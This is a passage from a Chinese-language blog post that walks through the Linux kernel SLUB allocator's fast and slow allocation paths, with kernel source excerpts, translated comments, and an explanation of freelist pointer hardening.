class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">maybe_wipe_obj_freeptr(s, object);<br>init = slab_want_init_on_alloc(gfpflags, s);<br><br>out:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 当 init == &#x27;true&#x27;, 类似 kzalloc() 族, </span><br><span class="hljs-comment"> * 仅有 @orig_size 字节会被清零，而非 s-&gt;object_size</span><br><span class="hljs-comment"> */</span><br>slab_post_alloc_hook(s, objcg, gfpflags, <span class="hljs-number">1</span>, &amp;object, init, orig_size);<br><br><span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们来看真正的核心分配函数 <code>__slab_alloc_node()</code></p><h3 id="I-slab-alloc-node-：从-percpu-freelist-进行分配（fast-path）">I. __slab_alloc_node()：从 percpu freelist 进行分配（fast path）</h3><p>该函数首先会先获取 percpu 的 <code>kmem_cache_cpu</code> 上的 freelist 与 slab，<strong>若 slab 或 freelist 为空</strong> / slab 与 node 不匹配，则调用 <code>__slab_alloc()</code> 分配一张新 slab 并从其中获取一个空闲对象：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *__slab_alloc_node(<span class="hljs-keyword">struct</span> kmem_cache *s,<br><span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">size_t</span> orig_size)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> *<span class="hljs-title">c</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<br><span class="hljs-type">void</span> *object;<br><br>redo:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 必须通过该 cpu ptr 读取 kmem_cache cpu 数据. 抢占是开启的.</span><br><span class="hljs-comment"> * 我们可能会在从一个 cpu 区域读取时在 cpu 间切换.</span><br><span class="hljs-comment"> * 只要我们在 cmpxchg 时在原本的 cpu 上重新结束便不要紧.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 我们必须保证 tid 与 kmem_cache_cpu 被在同一 cpu 上取回.</span><br><span class="hljs-comment"> * 我们首先读取 kmem_cache_cpu 指针并用其读取 tid.</span><br><span class="hljs-comment"> * 若我们在两次读取间被抢占并切换到另一 cpu，由于这两者仍与同一 cpu 关联，</span><br><span class="hljs-comment"> * cmpxchg 稍后将会验证 cpu ，这是 OK 的.</span><br><span class="hljs-comment"> */</span><br>c = raw_cpu_ptr(s-&gt;cpu_slab);<br>tid = READ_ONCE(c-&gt;tid);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 此处使用的无中断（irqless） 对象分配/释放算法决定于获取 cpu_slab 数据的顺序.</span><br><span class="hljs-comment"> * tid 应当在在 c 上的任何事之前被获取以确保与此前 tid 关联的对象与 slab</span><br><span class="hljs-comment"> * 不会被与当前 tid 一起使用. 若我们先获取 tid，对象与 slab 可能会与下一个 tid </span><br><span class="hljs-comment"> * 相关联，而我们的分配/释放请求也将会失败.这种情况下我们会重试所以没问题.</span><br><span class="hljs-comment"> */</span><br>barrier();<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The transaction ids are globally unique per cpu and per operation on</span><br><span class="hljs-comment"> * a per cpu queue（这句翻成中文咋都不顺，直接看原文吧😄）.</span><br><span class="hljs-comment"> * 由此可以确保 cmpxchg_double 发生在正确的处理器上且其间在链表上没有任何操作.</span><br><span class="hljs-comment"> */</span><br><br>object = c-&gt;freelist;<br>slab = c-&gt;slab;<br><br><span class="hljs-keyword">if</span> (!USE_LOCKLESS_FAST_PATH() ||<br>    unlikely(!object || !slab || !node_match(slab, node))) &#123;<br>object = __slab_alloc(s, gfpflags, node, addr, c, orig_size);<br></code></pre></td></tr></table></figure><p>若有 freelist &amp; slub，则<strong>调用 <code>get_freepointer_safe()</code> 获取当前空闲对象下一个空闲对象</strong>；接下来 <code>this_cpu_cmpxchg_double()</code> 会检查是否 <code>freelist == object</code>、<code>cpu_slab-&gt;tid == tid</code>，若是则<strong>将 freelist 设为 next_object 并获取设置下一 tid</strong>，否则说明发生了抢占（我们已经不在原 cpu 上了），跳转回 <code>redo</code> 重新在当前 cpu 上进行分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">void</span> *next_object = get_freepointer_safe(s, object);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 仅当没有额外操作且我们在正确的处理器上时 cmpxchg 将匹配.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * cmpxchg 原子地进行了如下： (没有锁语义!)</span><br><span class="hljs-comment"> * 1. 重定位第一个指针到当前的 per cpu 区域.</span><br><span class="hljs-comment"> * 2. 验证 tid &amp; freelist 没有被改变</span><br><span class="hljs-comment"> * 3. 若未被改变，替换 tid &amp; freelist</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 自从没有锁语义，保护仅需要对抗在该 cpu 上执行的代码*不*从其他的 cpu 上访问.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(<br>s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,<br>object, tid,<br>next_object, next_tid(tid)))) &#123;<br><br>note_cmpxchg_failure(<span class="hljs-string">&quot;slab_alloc&quot;</span>, s, tid);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后对于直接从 cpu_slab 上分配的对象会通过 <code>prefetch_freepointer()</code> 调用 prefetchw 指令提前将已分配对象的地址载入缓存中，之后就是返回分配成功的空闲对象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">prefetch_freepointer(s, next_object);<br>stat(s, ALLOC_FASTPATH);<br>&#125;<br><br><span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="II-slab-alloc-：获取另一-slab-进行分配（slow-path）">II. ___slab_alloc()：获取另一 slab 进行分配（slow path）</h3><p><code>__slab_alloc()</code> 其实是在开启了抢占的情况下（默认开启）对 <code>___slab_alloc()</code> 的一个简单的 wrapper，主要就是重新读取 <code>kmem_cache_cpu</code> 的指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 当抢占没有关闭时 ___slab_alloc() 用于上下文的 wrapper.</span><br><span class="hljs-comment"> * 通过重新获取 percpu 区域的指针来补偿可能的 cpu 更改.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *__slab_alloc(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node,<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-keyword">struct</span> kmem_cache_cpu *c, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> orig_size)<br>&#123;<br><span class="hljs-type">void</span> *p;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PREEMPT_COUNT</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们可能已被抢占且在关闭抢占前调度到了不同的 cpu 上.</span><br><span class="hljs-comment"> * 需要重新载入 cpu 区域指针.</span><br><span class="hljs-comment"> */</span><br>c = slub_get_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>p = ___slab_alloc(s, gfpflags, node, addr, c, orig_size);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PREEMPT_COUNT</span><br>slub_put_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们来看 <code>___slab_alloc()</code>，该函数便是慢速分配路径的核心函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 慢速路径. 无锁 freelist 为空或是我们需要进行调试任务.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若新的对象已经被释放到常规的 freelist 上，则过程仍是很快的.</span><br><span class="hljs-comment"> * 这种情况下我们简单地让常规的 freelist 取代无锁 freelist</span><br><span class="hljs-comment"> * 并 zap the regular freelist.（zap想不出咋翻译好😄）</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若这不起作用，则我们回退到 partial 链表. 我们将 freelist 上的第一个元素</span><br><span class="hljs-comment"> * 作为要分配的对象并将 freelist 的剩余部分移动到无锁 freelist.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若我们无法从 partial slab 链表上获得一个新的 slab，我们需要分配一个新的 slab.</span><br><span class="hljs-comment"> * 因为这包含对页分配器的调用与新 slab 的设置，这是最慢的路径.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 当我们知道抢占被禁用时所用的 __slab_alloc 的版本 (也是造成大量分配的原因).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *___slab_alloc(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node,<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-keyword">struct</span> kmem_cache_cpu *c, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> orig_size)<br>&#123;<br><span class="hljs-type">void</span> *freelist;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">partial_context</span> <span class="hljs-title">pc</span>;</span><br><br>stat(s, ALLOC_SLOWPATH);<br></code></pre></td></tr></table></figure><p>接下来笔者按照代码标签顺序进行分析</p><h4 id="①-reread-slab：读取-percpu-slab">① reread_slab：读取 percpu slab</h4><p>首先读取 percpu 的 slab，若没有 slab 则判断分配节点，并跳转到 <code>new_slab</code> 分配新的 slab，注意这一块代码对应 <code>reread_slab</code> 标签：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">reread_slab:<br><br>slab = READ_ONCE(c-&gt;slab);<br><span class="hljs-keyword">if</span> (!slab) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若 node 未上线或没有 normal memory，忽略 node 约束</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(node != NUMA_NO_NODE &amp;&amp;<br>     !node_isset(node, slab_nodes)))<br>node = NUMA_NO_NODE;<br><span class="hljs-keyword">goto</span> new_slab;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="②-redo：获取-percpu-slab-freelist">② redo：获取 percpu slab-&gt;freelist</h4><p>接下来这块代码对应 <code>redo</code> 标签：</p><ul><li><p>若 percpu slab 不为空，判断 slab 是否属于指定的节点且与分配标志位匹配，若否，则跳转到 <code>deactivate_slab</code> 标签</p></li><li><p>接下来检查 slab 是否仍为原来的 cpu slab（因为我们可能被抢占），若否，则跳转回 <code>reread_slab</code></p></li><li><p>接下来获取 per-cpu 的 freelist，若不为空，则跳转到 <code>load_freelist</code>，否则<strong>调用 <code>get_freelist()</code> 获取 slab 的 freelist</strong></p></li><li><p>若 slab 的 freelist 仍为空，将 per-cpu freelist 设为 NULL，获取下一个 tid，并跳转到 <code>new_slab</code> 分配新的 slab</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">redo:<br><br><span class="hljs-keyword">if</span> (unlikely(!node_match(slab, node))) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 与上面相同但 node_match() 为 false 则早已说明 node != NUMA_NO_NODE</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!node_isset(node, slab_nodes)) &#123;<br>node = NUMA_NO_NODE;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>stat(s, ALLOC_NODE_MISMATCH);<br><span class="hljs-keyword">goto</span> deactivate_slab;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们理应搜索一个 PFMEMALLOC 的 slab 页面，但现在，</span><br><span class="hljs-comment"> * 当页面离开 per-cpu 分配器，我们正在失去 pfmemalloc 信息</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags)))<br><span class="hljs-keyword">goto</span> deactivate_slab;<br><br><span class="hljs-comment">/* 必须再次检查 c-&gt;slab 以免我们被抢占使其发生了更改 */</span><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br>freelist = c-&gt;freelist;<br><span class="hljs-keyword">if</span> (freelist)<br><span class="hljs-keyword">goto</span> load_freelist;<br><br>freelist = get_freelist(s, slab);<br><br><span class="hljs-keyword">if</span> (!freelist) &#123;<br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>stat(s, DEACTIVATE_BYPASS);<br><span class="hljs-keyword">goto</span> new_slab;<br>&#125;<br><br>stat(s, ALLOC_REFILL);<br></code></pre></td></tr></table></figure><p><code>get_freelist()</code> 函数主要就是获取 <code>slab-&gt;freelist</code> 后将 <code>slab-&gt;freelist</code> 设为 NULL 并返回原来的 freelist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 检查 slab-&gt;freelist 并将 freelist 传送给 percpu freelist</span><br><span class="hljs-comment"> * 或是将 slab 给 deactivate.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若返回值非 NULL 则 slab 仍被冻结.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若该函数返回 NULL 则 slab 被解冻.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">get_freelist</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-type">void</span> *freelist;<br><br>lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));<br><br><span class="hljs-keyword">do</span> &#123;<br>freelist = slab-&gt;freelist;<br>counters = slab-&gt;counters;<br><br>new.counters = counters;<br>VM_BUG_ON(!new.frozen);<br><br>new.inuse = slab-&gt;objects;<br>new.frozen = freelist != <span class="hljs-literal">NULL</span>;<br><br>&#125; <span class="hljs-keyword">while</span> (!__cmpxchg_double_slab(s, slab,<br>freelist, counters,<br><span class="hljs-literal">NULL</span>, new.counters,<br><span class="hljs-string">&quot;get_freelist&quot;</span>));<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="③-load-freelist：从-freelist-分配对象">③ load_freelist：从 freelist 分配对象</h4><p>继续返回 <code>___slab_alloc()</code> 中，接下来这块代码对应 <code>load_freelist</code> 标签，主要就是调用 <code>get_freepointer()</code> 将 percpu freelist 指向第二个空闲对象，并获取下一个 tid 后返回前面获取的 freelist（也就是第一个空闲对象）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">load_freelist:<br><br>lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * freelist 指向要被使用的对象链表. slab 指向获得对象的 slab.</span><br><span class="hljs-comment"> * 因此 slab 必须被冻结以让 percpu 的分配正常工作.</span><br><span class="hljs-comment"> */</span><br>VM_BUG_ON(!c-&gt;slab-&gt;frozen);<br>c-&gt;freelist = get_freepointer(s, freelist);<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">return</span> freelist;<br></code></pre></td></tr></table></figure><p>这里注意在 <code>get_freepointer()</code> 里套了两层，最后会调用到 <code>freelist_ptr()</code> 获取到第二个空闲对象的指针，这里需要注意的是当开启了 Hardened freelist 保护后在 next 指针的位置存放的是 <strong>第一个空闲对象地址 ^ 第二个空闲对象地址 ^ 一个随机值</strong>（<code>kmem_cache-&gt;random</code>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 返回 freelist 指针 (ptr). 在有加固的情况下其通过一个</span><br><span class="hljs-comment"> * 对存储指针的地址与 per-cache 随机值的异或进行混淆.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">freelist_ptr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *ptr,</span><br><span class="hljs-params"> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ptr_addr)</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 当开启了 CONFIG_KASAN_SW/HW_TAGS, ptr_addr 可能被打上标签.</span><br><span class="hljs-comment"> * 通常这不会造成任何问题，因为 set_freepointer() 与 get_freepointer() </span><br><span class="hljs-comment"> * 调用时都会有标签相同的指针.</span><br><span class="hljs-comment"> * 但是 CONFIG_SLUB_DEBUG 的代码有些问题. 例如当 __free_slub() 在</span><br><span class="hljs-comment"> * 一个 cache 中迭代对象时,其将没有标签的指针传给 check_object(). </span><br><span class="hljs-comment"> * check_object() 依次带着一个没有标签的指针调用 get_freepointer()，</span><br><span class="hljs-comment"> * 从而造成 freepointer 存储错误.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ptr ^ s-&gt;random ^<br>swab((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)kasan_reset_tag((<span class="hljs-type">void</span> *)ptr_addr)));<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">return</span> ptr;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p>从这里我们也可以看出 <strong>slab-&gt;freelist 是没有加密的，但链表上的后续指针都是加密了的</strong></p><h4 id="④-deactivate-slab：deactivate-percpu-slab">④ deactivate_slab：deactivate percpu slab</h4><p>继续返回 <code>___slab_alloc()</code> 中，接下来这块代码对应 <code>deactivate_slab</code> 标签，首先还是惯例地检查是否被抢占调度到了别的 CPU，若是则跳转回 <code>reread_slab</code>；之后就是简单地将 percpu 的 slab 和 freelist 设为 NULL 并获取下一个 tid，之后调用 <code>deactivate_slab()</code> 将这张 slab 给 deactivate 了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">deactivate_slab:<br><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (slab != c-&gt;slab) &#123;<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br>freelist = c-&gt;freelist;<br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>deactivate_slab(s, slab, freelist);<br></code></pre></td></tr></table></figure><p><code>deactivate_slab()</code> 的逻辑如下：</p><ul><li>遍历 freelist 检查是否被破坏，放弃被破坏的部分</li><li>将 <code>slab-&gt;freelist</code> 设为原 <code>kmem_cache_cpu-&gt;freelist</code>，若 slab 上原有 freelist 不为 NULL 则再接到后面</li><li>设置 slab 的 counters，其中<strong>将 <code>frozen</code> 设为 0</strong></li><li>若 slab 上的对象全部空闲<strong>且 node 的 partial slab 数量大于 <code>kmem_cache-&gt;min_partial</code></strong>，调用 <code>discard_slab()</code> 将 slab 释放</li><li>若 slab 上存在空闲对象，调用 <code>add_partial()</code> 将其加入 node 的 partial 链表</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs c"><span 